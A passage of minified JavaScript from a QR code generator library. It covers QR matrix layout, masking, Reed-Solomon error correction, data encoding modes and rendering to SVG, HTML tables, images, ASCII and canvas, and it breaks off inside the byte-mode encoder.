(function () {
  "use strict";
  const X = function (e, a) {
    let n = e;
    const l = _[a];
    let t = null,
      A = 0,
      s = null;
    const w = [],
      b = {},
      d = function (r, p) {
        ((A = n * 4 + 17),
          (t = (function (i) {
            const f = new Array(i);
            for (let g = 0; g < i; g += 1) {
              f[g] = new Array(i);
              for (let B = 0; B < i; B += 1) f[g][B] = null;
            }
            return f;
          })(A)),
          u(0, 0),
          u(A - 7, 0),
          u(0, A - 7),
          E(),
          k(),
          C(r, p),
          n >= 7 && v(r),
          s == null && (s = h(n, l, w)),
          x(s, p));
      },
      u = function (r, p) {
        for (let i = -1; i <= 7; i += 1)
          if (!(r + i <= -1 || A <= r + i))
            for (let f = -1; f <= 7; f += 1)
              p + f <= -1 ||
                A <= p + f ||
                ((0 <= i && i <= 6 && (f == 0 || f == 6)) ||
                (0 <= f && f <= 6 && (i == 0 || i == 6)) ||
                (2 <= i && i <= 4 && 2 <= f && f <= 4)
                  ? (t[r + i][p + f] = !0)
                  : (t[r + i][p + f] = !1));
      },
      m = function () {
        let r = 0,
          p = 0;
        for (let i = 0; i < 8; i += 1) {
          d(!0, i);
          const f = O.getLostPoint(b);
          (i == 0 || r > f) && ((r = f), (p = i));
        }
        return p;
      },
      k = function () {
        for (let r = 8; r < A - 8; r += 1)
          t[r][6] == null && (t[r][6] = r % 2 == 0);
        for (let r = 8; r < A - 8; r += 1)
          t[6][r] == null && (t[6][r] = r % 2 == 0);
      },
      E = function () {
        const r = O.getPatternPosition(n);
        for (let p = 0; p < r.length; p += 1)
          for (let i = 0; i < r.length; i += 1) {
            const f = r[p],
              g = r[i];
            if (t[f][g] == null)
              for (let B = -2; B <= 2; B += 1)
                for (let y = -2; y <= 2; y += 1)
                  B == -2 || B == 2 || y == -2 || y == 2 || (B == 0 && y == 0)
                    ? (t[f + B][g + y] = !0)
                    : (t[f + B][g + y] = !1);
          }
      },
      v = function (r) {
        const p = O.getBCHTypeNumber(n);
        for (let i = 0; i < 18; i += 1) {
          const f = !r && ((p >> i) & 1) == 1;
          t[Math.floor(i / 3)][(i % 3) + A - 8 - 3] = f;
        }
        for (let i = 0; i < 18; i += 1) {
          const f = !r && ((p >> i) & 1) == 1;
          t[(i % 3) + A - 8 - 3][Math.floor(i / 3)] = f;
        }
      },
      C = function (r, p) {
        const i = (l << 3) | p,
          f = O.getBCHTypeInfo(i);
        for (let g = 0; g < 15; g += 1) {
          const B = !r && ((f >> g) & 1) == 1;
          g < 6
            ? (t[g][8] = B)
            : g < 8
              ? (t[g + 1][8] = B)
              : (t[A - 15 + g][8] = B);
        }
        for (let g = 0; g < 15; g += 1) {
          const B = !r && ((f >> g) & 1) == 1;
          g < 8
            ? (t[8][A - g - 1] = B)
            : g < 9
              ? (t[8][15 - g - 1 + 1] = B)
              : (t[8][15 - g - 1] = B);
        }
        t[A - 8][8] = !r;
      },
      x = function (r, p) {
        let i = -1,
          f = A - 1,
          g = 7,
          B = 0;
        const y = O.getMaskFunction(p);
        for (let Q = A - 1; Q > 0; Q -= 2)
          for (Q == 6 && (Q -= 1); ; ) {
            for (let U = 0; U < 2; U += 1)
              if (t[f][Q - U] == null) {
                let F = !1;
                (B < r.length && (F = ((r[B] >>> g) & 1) == 1),
                  y(f, Q - U) && (F = !F),
                  (t[f][Q - U] = F),
                  (g -= 1),
                  g == -1 && ((B += 1), (g = 7)));
              }
            if (((f += i), f < 0 || A <= f)) {
              ((f -= i), (i = -i));
              break;
            }
          }
      },
      D = function (r, p) {
        let i = 0,
          f = 0,
          g = 0;
        const B = new Array(p.length),
          y = new Array(p.length);
        for (let I = 0; I < p.length; I += 1) {
          const N = p[I].dataCount,
            W = p[I].totalCount - N;
          ((f = Math.max(f, N)), (g = Math.max(g, W)), (B[I] = new Array(N)));
          for (let T = 0; T < B[I].length; T += 1)
            B[I][T] = 255 & r.getBuffer()[T + i];
          i += N;
          const lA = O.getErrorCorrectPolynomial(W),
            mA = $(B[I], lA.getLength() - 1).mod(lA);
          y[I] = new Array(lA.getLength() - 1);
          for (let T = 0; T < y[I].length; T += 1) {
            const yA = T + mA.getLength() - y[I].length;
            y[I][T] = yA >= 0 ? mA.getAt(yA) : 0;
          }
        }
        let Q = 0;
        for (let I = 0; I < p.length; I += 1) Q += p[I].totalCount;
        const U = new Array(Q);
        let F = 0;
        for (let I = 0; I < f; I += 1)
          for (let N = 0; N < p.length; N += 1)
            I < B[N].length && ((U[F] = B[N][I]), (F += 1));
        for (let I = 0; I < g; I += 1)
          for (let N = 0; N < p.length; N += 1)
            I < y[N].length && ((U[F] = y[N][I]), (F += 1));
        return U;
      },
      h = function (r, p, i) {
        const f = dA.getRSBlocks(r, p),
          g = gA();
        for (let y = 0; y < i.length; y += 1) {
          const Q = i[y];
          (g.put(Q.getMode(), 4),
            g.put(Q.getLength(), O.getLengthInBits(Q.getMode(), r)),
            Q.write(g));
        }
        let B = 0;
        for (let y = 0; y < f.length; y += 1) B += f[y].dataCount;
        if (g.getLengthInBits() > B * 8)
          throw (
            "code length overflow. (" + g.getLengthInBits() + ">" + B * 8 + ")"
          );
        for (
          g.getLengthInBits() + 4 <= B * 8 && g.put(0, 4);
          g.getLengthInBits() % 8 != 0;
        )
          g.putBit(!1);
        for (
          ;
          !(
            g.getLengthInBits() >= B * 8 ||
            (g.put(236, 8), g.getLengthInBits() >= B * 8)
          );
        )
          g.put(17, 8);
        return D(g, f);
      };
    ((b.addData = function (r, p) {
      p = p || "Byte";
      let i = null;
      switch (p) {
        case "Numeric":
          i = CA(r);
          break;
        case "Alphanumeric":
          i = IA(r);
          break;
        case "Byte":
          i = vA(r);
          break;
        case "Kanji":
          i = xA(r);
          break;
        default:
          throw "mode:" + p;
      }
      (w.push(i), (s = null));
    }),
      (b.isDark = function (r, p) {
        if (r < 0 || A <= r || p < 0 || A <= p) throw r + "," + p;
        return t[r][p];
      }),
      (b.getModuleCount = function () {
        return A;
      }),
      (b.make = function () {
        if (n < 1) {
          let r = 1;
          for (; r < 40; r++) {
            const p = dA.getRSBlocks(r, l),
              i = gA();
            for (let g = 0; g < w.length; g++) {
              const B = w[g];
              (i.put(B.getMode(), 4),
                i.put(B.getLength(), O.getLengthInBits(B.getMode(), r)),
                B.write(i));
            }
            let f = 0;
            for (let g = 0; g < p.length; g++) f += p[g].dataCount;
            if (i.getLengthInBits() <= f * 8) break;
          }
          n = r;
        }
        d(!1, m());
      }),
      (b.createTableTag = function (r, p) {
        ((r = r || 2), (p = typeof p > "u" ? r * 4 : p));
        let i = "";
        ((i += '<table style="'),
          (i += " border-width: 0px; border-style: none;"),
          (i += " border-collapse: collapse;"),
          (i += " padding: 0px; margin: " + p + "px;"),
          (i += '">'),
          (i += "<tbody>"));
        for (let f = 0; f < b.getModuleCount(); f += 1) {
          i += "<tr>";
          for (let g = 0; g < b.getModuleCount(); g += 1)
            ((i += '<td style="'),
              (i += " border-width: 0px; border-style: none;"),
              (i += " border-collapse: collapse;"),
              (i += " padding: 0px; margin: 0px;"),
              (i += " width: " + r + "px;"),
              (i += " height: " + r + "px;"),
              (i += " background-color: "),
              (i += b.isDark(f, g) ? "#000000" : "#ffffff"),
              (i += ";"),
              (i += '"/>'));
          i += "</tr>";
        }
        return ((i += "</tbody>"), (i += "</table>"), i);
      }),
      (b.createSvgTag = function (r, p, i, f) {
        let g = {};
        (typeof arguments[0] == "object" &&
          ((g = arguments[0]),
          (r = g.cellSize),
          (p = g.margin),
          (i = g.alt),
          (f = g.title)),
          (r = r || 2),
          (p = typeof p > "u" ? r * 4 : p),
          (i = typeof i == "string" ? { text: i } : i || {}),
          (i.text = i.text || null),
          (i.id = i.text ? i.id || "qrcode-description" : null),
          (f = typeof f == "string" ? { text: f } : f || {}),
          (f.text = f.text || null),
          (f.id = f.text ? f.id || "qrcode-title" : null));
        const B = b.getModuleCount() * r + p * 2;
        let y,
          Q,
          U,
          F,
          I = "",
          N;
        for (
          N = "l" + r + ",0 0," + r + " -" + r + ",0 0,-" + r + "z ",
            I += '<svg version="1.1" xmlns="http://www.w3.org/2000/svg"',
            I += g.scalable ? "" : ' width="' + B + 'px" height="' + B + 'px"',
            I += ' viewBox="0 0 ' + B + " " + B + '" ',
            I += ' preserveAspectRatio="xMinYMin meet"',
            I +=
              f.text || i.text
                ? ' role="img" aria-labelledby="' +
                  R([f.id, i.id].join(" ").trim()) +
                  '"'
                : "",
            I += ">",
            I += f.text
              ? '<title id="' + R(f.id) + '">' + R(f.text) + "</title>"
              : "",
            I += i.text
              ? '<description id="' +
                R(i.id) +
                '">' +
                R(i.text) +
                "</description>"
              : "",
            I +=
              '<rect width="100%" height="100%" fill="white" cx="0" cy="0"/>',
            I += '<path d="',
            U = 0;
          U < b.getModuleCount();
          U += 1
        )
          for (F = U * r + p, y = 0; y < b.getModuleCount(); y += 1)
            b.isDark(U, y) && ((Q = y * r + p), (I += "M" + Q + "," + F + N));
        return (
          (I += '" stroke="transparent" fill="black"/>'),
          (I += "</svg>"),
          I
        );
      }),
      (b.createDataURL = function (r, p) {
        ((r = r || 2), (p = typeof p > "u" ? r * 4 : p));
        const i = b.getModuleCount() * r + p * 2,
          f = p,
          g = i - p;
        return QA(i, i, function (B, y) {
          if (f <= B && B < g && f <= y && y < g) {
            const Q = Math.floor((B - f) / r),
              U = Math.floor((y - f) / r);
            return b.isDark(U, Q) ? 0 : 1;
          } else return 1;
        });
      }),
      (b.createImgTag = function (r, p, i) {
        ((r = r || 2), (p = typeof p > "u" ? r * 4 : p));
        const f = b.getModuleCount() * r + p * 2;
        let g = "";
        return (
          (g += "<img"),
          (g += ' src="'),
          (g += b.createDataURL(r, p)),
          (g += '"'),
          (g += ' width="'),
          (g += f),
          (g += '"'),
          (g += ' height="'),
          (g += f),
          (g += '"'),
          i && ((g += ' alt="'), (g += R(i)), (g += '"')),
          (g += "/>"),
          g
        );
      }));
    const R = function (r) {
        let p = "";
        for (let i = 0; i < r.length; i += 1) {
          const f = r.charAt(i);
          switch (f) {
            case "<":
              p += "&lt;";
              break;
            case ">":
              p += "&gt;";
              break;
            case "&":
              p += "&amp;";
              break;
            case '"':
              p += "&quot;";
              break;
            default:
              p += f;
              break;
          }
        }
        return p;
      },
      P = function (r) {
        r = typeof r > "u" ? 1 * 2 : r;
        const i = b.getModuleCount() * 1 + r * 2,
          f = r,
          g = i - r;
        let B, y, Q, U, F;
        const I = { "██": "█", "█ ": "▀", " █": "▄", "  ": " " },
          N = { "██": "▀", "█ ": "▀", " █": " ", "  ": " " };
        let W = "";
        for (B = 0; B < i; B += 2) {
          for (
            Q = Math.floor((B - f) / 1), U = Math.floor((B + 1 - f) / 1), y = 0;
            y < i;
            y += 1
          )
            ((F = "█"),
              f <= y &&
                y < g &&
                f <= B &&
                B < g &&
                b.isDark(Q, Math.floor((y - f) / 1)) &&
                (F = " "),
              f <= y &&
              y < g &&
              f <= B + 1 &&
              B + 1 < g &&
              b.isDark(U, Math.floor((y - f) / 1))
                ? (F += " ")
                : (F += "█"),
              (W += r < 1 && B + 1 >= g ? N[F] : I[F]));
          W += `
`;
        }
        return i % 2 && r > 0
          ? W.substring(0, W.length - i - 1) + Array(i + 1).join("▀")
          : W.substring(0, W.length - 1);
      };
    return (
      (b.createASCII = function (r, p) {
        if (((r = r || 1), r < 2)) return P(p);
        ((r -= 1), (p = typeof p > "u" ? r * 2 : p));
        const i = b.getModuleCount() * r + p * 2,
          f = p,
          g = i - p;
        let B, y, Q, U;
        const F = Array(r + 1).join("██"),
          I = Array(r + 1).join("  ");
        let N = "",
          W = "";
        for (B = 0; B < i; B += 1) {
          for (Q = Math.floor((B - f) / r), W = "", y = 0; y < i; y += 1)
            ((U = 1),
              f <= y &&
                y < g &&
                f <= B &&
                B < g &&
                b.isDark(Q, Math.floor((y - f) / r)) &&
                (U = 0),
              (W += U ? F : I));
          for (Q = 0; Q < r; Q += 1)
            N +=
              W +
              `
`;
        }
        return N.substring(0, N.length - 1);
      }),
      (b.renderTo2dContext = function (r, p) {
        p = p || 2;
        const i = b.getModuleCount();
        for (let f = 0; f < i; f++)
          for (let g = 0; g < i; g++)
            ((r.fillStyle = b.isDark(f, g) ? "black" : "white"),
              r.fillRect(g * p, f * p, p, p));
      }),
      b
    );
  };
  ((X.stringToBytes = function (e) {
    const a = [];
    for (let c = 0; c < e.length; c += 1) {
      const o = e.charCodeAt(c);
      a.push(o & 255);
    }
    return a;
  }),
    (X.createStringToBytes = function (e, a) {
      const c = (function () {
          const n = EA(e),
            l = function () {
              const s = n.read();
              if (s == -1) throw "eof";
              return s;
            };
          let t = 0;
          const A = {};
          for (;;) {
            const s = n.read();
            if (s == -1) break;
            const w = l(),
              b = l(),
              d = l(),
              u = String.fromCharCode((s << 8) | w),
              m = (b << 8) | d;
            ((A[u] = m), (t += 1));
          }
          if (t != a) throw t + " != " + a;
          return A;
        })(),
        o = 63;
      return function (n) {
        const l = [];
        for (let t = 0; t < n.length; t += 1) {
          const A = n.charCodeAt(t);
          if (A < 128) l.push(A);
          else {
            const s = c[n.charAt(t)];
            typeof s == "number"
              ? (s & 255) == s
                ? l.push(s)
                : (l.push(s >>> 8), l.push(s & 255))
              : l.push(o);
          }
        }
        return l;
      };
    }));
  const M = {
      MODE_NUMBER: 1,
      MODE_ALPHA_NUM: 2,
      MODE_8BIT_BYTE: 4,
      MODE_KANJI: 8,
    },
    _ = { L: 1, M: 0, Q: 3, H: 2 },
    S = {
      PATTERN000: 0,
      PATTERN001: 1,
      PATTERN010: 2,
      PATTERN011: 3,
      PATTERN100: 4,
      PATTERN101: 5,
      PATTERN110: 6,
      PATTERN111: 7,
    },
    O = (function () {
      const e = [
          [],
          [6, 18],
          [6, 22],
          [6, 26],
          [6, 30],
          [6, 34],
          [6, 22, 38],
          [6, 24, 42],
          [6, 26, 46],
          [6, 28, 50],
          [6, 30, 54],
          [6, 32, 58],
          [6, 34, 62],
          [6, 26, 46, 66],
          [6, 26, 48, 70],
          [6, 26, 50, 74],
          [6, 30, 54, 78],
          [6, 30, 56, 82],
          [6, 30, 58, 86],
          [6, 34, 62, 90],
          [6, 28, 50, 72, 94],
          [6, 26, 50, 74, 98],
          [6, 30, 54, 78, 102],
          [6, 28, 54, 80, 106],
          [6, 32, 58, 84, 110],
          [6, 30, 58, 86, 114],
          [6, 34, 62, 90, 118],
          [6, 26, 50, 74, 98, 122],
          [6, 30, 54, 78, 102, 126],
          [6, 26, 52, 78, 104, 130],
          [6, 30, 56, 82, 108, 134],
          [6, 34, 60, 86, 112, 138],
          [6, 30, 58, 86, 114, 142],
          [6, 34, 62, 90, 118, 146],
          [6, 30, 54, 78, 102, 126, 150],
          [6, 24, 50, 76, 102, 128, 154],
          [6, 28, 54, 80, 106, 132, 158],
          [6, 32, 58, 84, 110, 136, 162],
          [6, 26, 54, 82, 110, 138, 166],
          [6, 30, 58, 86, 114, 142, 170],
        ],
        a = 1335,
        c = 7973,
        o = 21522,
        n = {},
        l = function (t) {
          let A = 0;
          for (; t != 0; ) ((A += 1), (t >>>= 1));
          return A;
        };
      return (
        (n.getBCHTypeInfo = function (t) {
          let A = t << 10;
          for (; l(A) - l(a) >= 0; ) A ^= a << (l(A) - l(a));
          return ((t << 10) | A) ^ o;
        }),
        (n.getBCHTypeNumber = function (t) {
          let A = t << 12;
          for (; l(A) - l(c) >= 0; ) A ^= c << (l(A) - l(c));
          return (t << 12) | A;
        }),
        (n.getPatternPosition = function (t) {
          return e[t - 1];
        }),
        (n.getMaskFunction = function (t) {
          switch (t) {
            case S.PATTERN000:
              return function (A, s) {
                return (A + s) % 2 == 0;
              };
            case S.PATTERN001:
              return function (A, s) {
                return A % 2 == 0;
              };
            case S.PATTERN010:
              return function (A, s) {
                return s % 3 == 0;
              };
            case S.PATTERN011:
              return function (A, s) {
                return (A + s) % 3 == 0;
              };
            case S.PATTERN100:
              return function (A, s) {
                return (Math.floor(A / 2) + Math.floor(s / 3)) % 2 == 0;
              };
            case S.PATTERN101:
              return function (A, s) {
                return ((A * s) % 2) + ((A * s) % 3) == 0;
              };
            case S.PATTERN110:
              return function (A, s) {
                return (((A * s) % 2) + ((A * s) % 3)) % 2 == 0;
              };
            case S.PATTERN111:
              return function (A, s) {
                return (((A * s) % 3) + ((A + s) % 2)) % 2 == 0;
              };
            default:
              throw "bad maskPattern:" + t;
          }
        }),
        (n.getErrorCorrectPolynomial = function (t) {
          let A = $([1], 0);
          for (let s = 0; s < t; s += 1) A = A.multiply($([1, L.gexp(s)], 0));
          return A;
        }),
        (n.getLengthInBits = function (t, A) {
          if (1 <= A && A < 10)
            switch (t) {
              case M.MODE_NUMBER:
                return 10;
              case M.MODE_ALPHA_NUM:
                return 9;
              case M.MODE_8BIT_BYTE:
                return 8;
              case M.MODE_KANJI:
                return 8;
              default:
                throw "mode:" + t;
            }
          else if (A < 27)
            switch (t) {
              case M.MODE_NUMBER:
                return 12;
              case M.MODE_ALPHA_NUM:
                return 11;
              case M.MODE_8BIT_BYTE:
                return 16;
              case M.MODE_KANJI:
                return 10;
              default:
                throw "mode:" + t;
            }
          else if (A < 41)
            switch (t) {
              case M.MODE_NUMBER:
                return 14;
              case M.MODE_ALPHA_NUM:
                return 13;
              case M.MODE_8BIT_BYTE:
                return 16;
              case M.MODE_KANJI:
                return 12;
              default:
                throw "mode:" + t;
            }
          else throw "type:" + A;
        }),
        (n.getLostPoint = function (t) {
          const A = t.getModuleCount();
          let s = 0;
          for (let d = 0; d < A; d += 1)
            for (let u = 0; u < A; u += 1) {
              let m = 0;
              const k = t.isDark(d, u);
              for (let E = -1; E <= 1; E += 1)
                if (!(d + E < 0 || A <= d + E))
                  for (let v = -1; v <= 1; v += 1)
                    u + v < 0 ||
                      A <= u + v ||
                      (E == 0 && v == 0) ||
                      (k == t.isDark(d + E, u + v) && (m += 1));
              m > 5 && (s += 3 + m - 5);
            }
          for (let d = 0; d < A - 1; d += 1)
            for (let u = 0; u < A - 1; u += 1) {
              let m = 0;
              (t.isDark(d, u) && (m += 1),
                t.isDark(d + 1, u) && (m += 1),
                t.isDark(d, u + 1) && (m += 1),
                t.isDark(d + 1, u + 1) && (m += 1),
                (m == 0 || m == 4) && (s += 3));
            }
          for (let d = 0; d < A; d += 1)
            for (let u = 0; u < A - 6; u += 1)
              t.isDark(d, u) &&
                !t.isDark(d, u + 1) &&
                t.isDark(d, u + 2) &&
                t.isDark(d, u + 3) &&
                t.isDark(d, u + 4) &&
                !t.isDark(d, u + 5) &&
                t.isDark(d, u + 6) &&
                (s += 40);
          for (let d = 0; d < A; d += 1)
            for (let u = 0; u < A - 6; u += 1)
              t.isDark(u, d) &&
                !t.isDark(u + 1, d) &&
                t.isDark(u + 2, d) &&
                t.isDark(u + 3, d) &&
                t.isDark(u + 4, d) &&
                !t.isDark(u + 5, d) &&
                t.isDark(u + 6, d) &&
                (s += 40);
          let w = 0;
          for (let d = 0; d < A; d += 1)
            for (let u = 0; u < A; u += 1) t.isDark(u, d) && (w += 1);
          const b = Math.abs((100 * w) / A / A - 50) / 5;
          return ((s += b * 10), s);
        }),
        n
      );
    })(),
    L = (function () {
      const e = new Array(256),
        a = new Array(256);
      for (let o = 0; o < 8; o += 1) e[o] = 1 << o;
      for (let o = 8; o < 256; o += 1)
        e[o] = e[o - 4] ^ e[o - 5] ^ e[o - 6] ^ e[o - 8];
      for (let o = 0; o < 255; o += 1) a[e[o]] = o;
      const c = {};
      return (
        (c.glog = function (o) {
          if (o < 1) throw "glog(" + o + ")";
          return a[o];
        }),
        (c.gexp = function (o) {
          for (; o < 0; ) o += 255;
          for (; o >= 256; ) o -= 255;
          return e[o];
        }),
        c
      );
    })(),
    $ = function (e, a) {
      if (typeof e.length > "u") throw e.length + "/" + a;
      const c = (function () {
          let n = 0;
          for (; n < e.length && e[n] == 0; ) n += 1;
          const l = new Array(e.length - n + a);
          for (let t = 0; t < e.length - n; t += 1) l[t] = e[t + n];
          return l;
        })(),
        o = {};
      return (
        (o.getAt = function (n) {
          return c[n];
        }),
        (o.getLength = function () {
          return c.length;
        }),
        (o.multiply = function (n) {
          const l = new Array(o.getLength() + n.getLength() - 1);
          for (let t = 0; t < o.getLength(); t += 1)
            for (let A = 0; A < n.getLength(); A += 1)
              l[t + A] ^= L.gexp(L.glog(o.getAt(t)) + L.glog(n.getAt(A)));
          return $(l, 0);
        }),
        (o.mod = function (n) {
          if (o.getLength() - n.getLength() < 0) return o;
          const l = L.glog(o.getAt(0)) - L.glog(n.getAt(0)),
            t = new Array(o.getLength());
          for (let A = 0; A < o.getLength(); A += 1) t[A] = o.getAt(A);
          for (let A = 0; A < n.getLength(); A += 1)
            t[A] ^= L.gexp(L.glog(n.getAt(A)) + l);
          return $(t, 0).mod(n);
        }),
        o
      );
    },
    dA = (function () {
      const e = [
          [1, 26, 19],
          [1, 26, 16],
          [1, 26, 13],
          [1, 26, 9],
          [1, 44, 34],
          [1, 44, 28],
          [1, 44, 22],
          [1, 44, 16],
          [1, 70, 55],
          [1, 70, 44],
          [2, 35, 17],
          [2, 35, 13],
          [1, 100, 80],
          [2, 50, 32],
          [2, 50, 24],
          [4, 25, 9],
          [1, 134, 108],
          [2, 67, 43],
          [2, 33, 15, 2, 34, 16],
          [2, 33, 11, 2, 34, 12],
          [2, 86, 68],
          [4, 43, 27],
          [4, 43, 19],
          [4, 43, 15],
          [2, 98, 78],
          [4, 49, 31],
          [2, 32, 14, 4, 33, 15],
          [4, 39, 13, 1, 40, 14],
          [2, 121, 97],
          [2, 60, 38, 2, 61, 39],
          [4, 40, 18, 2, 41, 19],
          [4, 40, 14, 2, 41, 15],
          [2, 146, 116],
          [3, 58, 36, 2, 59, 37],
          [4, 36, 16, 4, 37, 17],
          [4, 36, 12, 4, 37, 13],
          [2, 86, 68, 2, 87, 69],
          [4, 69, 43, 1, 70, 44],
          [6, 43, 19, 2, 44, 20],
          [6, 43, 15, 2, 44, 16],
          [4, 101, 81],
          [1, 80, 50, 4, 81, 51],
          [4, 50, 22, 4, 51, 23],
          [3, 36, 12, 8, 37, 13],
          [2, 116, 92, 2, 117, 93],
          [6, 58, 36, 2, 59, 37],
          [4, 46, 20, 6, 47, 21],
          [7, 42, 14, 4, 43, 15],
          [4, 133, 107],
          [8, 59, 37, 1, 60, 38],
          [8, 44, 20, 4, 45, 21],
          [12, 33, 11, 4, 34, 12],
          [3, 145, 115, 1, 146, 116],
          [4, 64, 40, 5, 65, 41],
          [11, 36, 16, 5, 37, 17],
          [11, 36, 12, 5, 37, 13],
          [5, 109, 87, 1, 110, 88],
          [5, 65, 41, 5, 66, 42],
          [5, 54, 24, 7, 55, 25],
          [11, 36, 12, 7, 37, 13],
          [5, 122, 98, 1, 123, 99],
          [7, 73, 45, 3, 74, 46],
          [15, 43, 19, 2, 44, 20],
          [3, 45, 15, 13, 46, 16],
          [1, 135, 107, 5, 136, 108],
          [10, 74, 46, 1, 75, 47],
          [1, 50, 22, 15, 51, 23],
          [2, 42, 14, 17, 43, 15],
          [5, 150, 120, 1, 151, 121],
          [9, 69, 43, 4, 70, 44],
          [17, 50, 22, 1, 51, 23],
          [2, 42, 14, 19, 43, 15],
          [3, 141, 113, 4, 142, 114],
          [3, 70, 44, 11, 71, 45],
          [17, 47, 21, 4, 48, 22],
          [9, 39, 13, 16, 40, 14],
          [3, 135, 107, 5, 136, 108],
          [3, 67, 41, 13, 68, 42],
          [15, 54, 24, 5, 55, 25],
          [15, 43, 15, 10, 44, 16],
          [4, 144, 116, 4, 145, 117],
          [17, 68, 42],
          [17, 50, 22, 6, 51, 23],
          [19, 46, 16, 6, 47, 17],
          [2, 139, 111, 7, 140, 112],
          [17, 74, 46],
          [7, 54, 24, 16, 55, 25],
          [34, 37, 13],
          [4, 151, 121, 5, 152, 122],
          [4, 75, 47, 14, 76, 48],
          [11, 54, 24, 14, 55, 25],
          [16, 45, 15, 14, 46, 16],
          [6, 147, 117, 4, 148, 118],
          [6, 73, 45, 14, 74, 46],
          [11, 54, 24, 16, 55, 25],
          [30, 46, 16, 2, 47, 17],
          [8, 132, 106, 4, 133, 107],
          [8, 75, 47, 13, 76, 48],
          [7, 54, 24, 22, 55, 25],
          [22, 45, 15, 13, 46, 16],
          [10, 142, 114, 2, 143, 115],
          [19, 74, 46, 4, 75, 47],
          [28, 50, 22, 6, 51, 23],
          [33, 46, 16, 4, 47, 17],
          [8, 152, 122, 4, 153, 123],
          [22, 73, 45, 3, 74, 46],
          [8, 53, 23, 26, 54, 24],
          [12, 45, 15, 28, 46, 16],
          [3, 147, 117, 10, 148, 118],
          [3, 73, 45, 23, 74, 46],
          [4, 54, 24, 31, 55, 25],
          [11, 45, 15, 31, 46, 16],
          [7, 146, 116, 7, 147, 117],
          [21, 73, 45, 7, 74, 46],
          [1, 53, 23, 37, 54, 24],
          [19, 45, 15, 26, 46, 16],
          [5, 145, 115, 10, 146, 116],
          [19, 75, 47, 10, 76, 48],
          [15, 54, 24, 25, 55, 25],
          [23, 45, 15, 25, 46, 16],
          [13, 145, 115, 3, 146, 116],
          [2, 74, 46, 29, 75, 47],
          [42, 54, 24, 1, 55, 25],
          [23, 45, 15, 28, 46, 16],
          [17, 145, 115],
          [10, 74, 46, 23, 75, 47],
          [10, 54, 24, 35, 55, 25],
          [19, 45, 15, 35, 46, 16],
          [17, 145, 115, 1, 146, 116],
          [14, 74, 46, 21, 75, 47],
          [29, 54, 24, 19, 55, 25],
          [11, 45, 15, 46, 46, 16],
          [13, 145, 115, 6, 146, 116],
          [14, 74, 46, 23, 75, 47],
          [44, 54, 24, 7, 55, 25],
          [59, 46, 16, 1, 47, 17],
          [12, 151, 121, 7, 152, 122],
          [12, 75, 47, 26, 76, 48],
          [39, 54, 24, 14, 55, 25],
          [22, 45, 15, 41, 46, 16],
          [6, 151, 121, 14, 152, 122],
          [6, 75, 47, 34, 76, 48],
          [46, 54, 24, 10, 55, 25],
          [2, 45, 15, 64, 46, 16],
          [17, 152, 122, 4, 153, 123],
          [29, 74, 46, 14, 75, 47],
          [49, 54, 24, 10, 55, 25],
          [24, 45, 15, 46, 46, 16],
          [4, 152, 122, 18, 153, 123],
          [13, 74, 46, 32, 75, 47],
          [48, 54, 24, 14, 55, 25],
          [42, 45, 15, 32, 46, 16],
          [20, 147, 117, 4, 148, 118],
          [40, 75, 47, 7, 76, 48],
          [43, 54, 24, 22, 55, 25],
          [10, 45, 15, 67, 46, 16],
          [19, 148, 118, 6, 149, 119],
          [18, 75, 47, 31, 76, 48],
          [34, 54, 24, 34, 55, 25],
          [20, 45, 15, 61, 46, 16],
        ],
        a = function (n, l) {
          const t = {};
          return ((t.totalCount = n), (t.dataCount = l), t);
        },
        c = {},
        o = function (n, l) {
          switch (l) {
            case _.L:
              return e[(n - 1) * 4 + 0];
            case _.M:
              return e[(n - 1) * 4 + 1];
            case _.Q:
              return e[(n - 1) * 4 + 2];
            case _.H:
              return e[(n - 1) * 4 + 3];
            default:
              return;
          }
        };
      return (
        (c.getRSBlocks = function (n, l) {
          const t = o(n, l);
          if (typeof t > "u")
            throw (
              "bad rs block @ typeNumber:" + n + "/errorCorrectionLevel:" + l
            );
          const A = t.length / 3,
            s = [];
          for (let w = 0; w < A; w += 1) {
            const b = t[w * 3 + 0],
              d = t[w * 3 + 1],
              u = t[w * 3 + 2];
            for (let m = 0; m < b; m += 1) s.push(a(d, u));
          }
          return s;
        }),
        c
      );
    })(),
    gA = function () {
      const e = [];
      let a = 0;
      const c = {};
      return (
        (c.getBuffer = function () {
          return e;
        }),
        (c.getAt = function (o) {
          const n = Math.floor(o / 8);
          return ((e[n] >>> (7 - (o % 8))) & 1) == 1;
        }),
        (c.put = function (o, n) {
          for (let l = 0; l < n; l += 1)
            c.putBit(((o >>> (n - l - 1)) & 1) == 1);
        }),
        (c.getLengthInBits = function () {
          return a;
        }),
        (c.putBit = function (o) {
          const n = Math.floor(a / 8);
          (e.length <= n && e.push(0),
            o && (e[n] |= 128 >>> (a % 8)),
            (a += 1));
        }),
        c
      );
    },
    CA = function (e) {
      const a = M.MODE_NUMBER,
        c = e,
        o = {};
      ((o.getMode = function () {
        return a;
      }),
        (o.getLength = function (t) {
          return c.length;
        }),
        (o.write = function (t) {
          const A = c;
          let s = 0;
          for (; s + 2 < A.length; )
            (t.put(n(A.substring(s, s + 3)), 10), (s += 3));
          s < A.length &&
            (A.length - s == 1
              ? t.put(n(A.substring(s, s + 1)), 4)
              : A.length - s == 2 && t.put(n(A.substring(s, s + 2)), 7));
        }));
      const n = function (t) {
          let A = 0;
          for (let s = 0; s < t.length; s += 1) A = A * 10 + l(t.charAt(s));
          return A;
        },
        l = function (t) {
          if ("0" <= t && t <= "9") return t.charCodeAt(0) - 48;
          throw "illegal char :" + t;
        };
      return o;
    },
    IA = function (e) {
      const a = M.MODE_ALPHA_NUM,
        c = e,
        o = {};
      ((o.getMode = function () {
        return a;
      }),
        (o.getLength = function (l) {
          return c.length;
        }),
        (o.write = function (l) {
          const t = c;
          let A = 0;
          for (; A + 1 < t.length; )
            (l.put(n(t.charAt(A)) * 45 + n(t.charAt(A + 1)), 11), (A += 2));
          A < t.length && l.put(n(t.charAt(A)), 6);
        }));
      const n = function (l) {
        if ("0" <= l && l <= "9") return l.charCodeAt(0) - 48;
        if ("A" <= l && l <= "Z") return l.charCodeAt(0) - 65 + 10;
        switch (l) {
          case " ":
            return 36;
          case "$":
            return 37;
          case "%":
            return 38;
          case "*":
            return 39;
          case "+":
            return 40;
          case "-":
            return 41;
          case ".":
            return 42;
          case "/":
            return 43;
          case ":":
            return 44;
          default:
            throw "illegal char :" + l;
        }
      };
      return o;
    },
    vA = function (e) {
      const a = M.MODE_8BIT_BYTE,
        c = X.stringToBytes(e),
        o = {};
      return (
        (o.getMode = function () {
          return a;
